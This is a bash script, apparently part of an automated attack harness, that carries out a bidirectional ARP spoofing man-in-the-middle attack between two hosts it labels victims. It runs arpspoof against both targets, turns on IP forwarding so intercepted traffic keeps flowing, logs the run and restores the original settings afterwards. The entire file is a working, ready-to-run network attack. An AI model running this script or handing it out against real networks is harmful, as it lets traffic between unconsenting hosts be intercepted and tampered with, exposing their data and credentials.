#!/usr/bin/env bash
set -euo pipefail

: "${TARGET_A:?TARGET_A (victim 1) is required}"
: "${TARGET_B:?TARGET_B (victim 2) is required}"
: "${DURATION_SECONDS:?DURATION_SECONDS is required}"

RUN_ID="${RUN_ID:-run_unknown}"
OUT_DIR="${OUT_DIR:-runs/${RUN_ID}/arp_spoof}"
NETWORK_INTERFACE="${NETWORK_INTERFACE:-}"

mkdir -p "$OUT_DIR"

echo "[arp_spoof] TARGET_A: ${TARGET_A}"
echo "[arp_spoof] TARGET_B: ${TARGET_B}"
echo "[arp_spoof] DURATION: ${DURATION_SECONDS}s"
echo "[arp_spoof] OUT_DIR: ${OUT_DIR}"

ARPSPOOF_BIN=$(command -v arpspoof 2>/dev/null || echo "arpspoof")

if ! command -v "$ARPSPOOF_BIN" &>/dev/null; then
    echo "[arp_spoof] ERROR: arpspoof not found in PATH"
    exit 1
fi

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "[arp_spoof] ERROR: arpspoof requires root privileges"
    exit 1
fi

if [[ -z "$NETWORK_INTERFACE" ]]; then
    NETWORK_INTERFACE=$(ip route get "$TARGET_A" 2>/dev/null | grep -oP '(?<=dev )\S+' || echo "")
    if [[ -z "$NETWORK_INTERFACE" ]]; then
        echo "[arp_spoof] ERROR: Could not detect network interface"
        exit 1
    fi
fi

echo "[arp_spoof] Interface: ${NETWORK_INTERFACE}"

ORIGINAL_IPFWD=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo "0")

cleanup() {
    echo "[arp_spoof] Cleaning up..."
    pkill -P $$ arpspoof 2>/dev/null || true
    sysctl -w net.ipv4.ip_forward="$ORIGINAL_IPFWD" >/dev/null 2>&1 || true
    
    if command -v arping &>/dev/null; then
        arping -U -c 3 "$TARGET_A" 2>/dev/null || true
        arping -U -c 3 "$TARGET_B" 2>/dev/null || true
    fi
}

trap cleanup EXIT INT TERM

sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true

OUTPUT_FILE="${OUT_DIR}/arpspoof_output.txt"

{
    echo "=== ARP Spoofing Attack ==="
    echo "Start: $(date)"
    echo "Target A: $TARGET_A"
    echo "Target B: $TARGET_B"
    echo "Interface: $NETWORK_INTERFACE"
    echo "Duration: ${DURATION_SECONDS}s"
    echo ""
} > "$OUTPUT_FILE"

"$ARPSPOOF_BIN" -i "$NETWORK_INTERFACE" -t "$TARGET_A" "$TARGET_B" >> "$OUTPUT_FILE" 2>&1 &
ARPSPOOF_PID_A=$!

"$ARPSPOOF_BIN" -i "$NETWORK_INTERFACE" -t "$TARGET_B" "$TARGET_A" >> "$OUTPUT_FILE" 2>&1 &
ARPSPOOF_PID_B=$!

echo "[arp_spoof] PIDs: [$ARPSPOOF_PID_A, $ARPSPOOF_PID_B]"

sleep "$DURATION_SECONDS" || {
    echo "[arp_spoof] Interrupted"
    exit 130
}

kill $ARPSPOOF_PID_A $ARPSPOOF_PID_B 2>/dev/null || true

{
    echo ""
    echo "End: $(date)"
} >> "$OUTPUT_FILE"

echo "[arp_spoof] Completed"
exit 0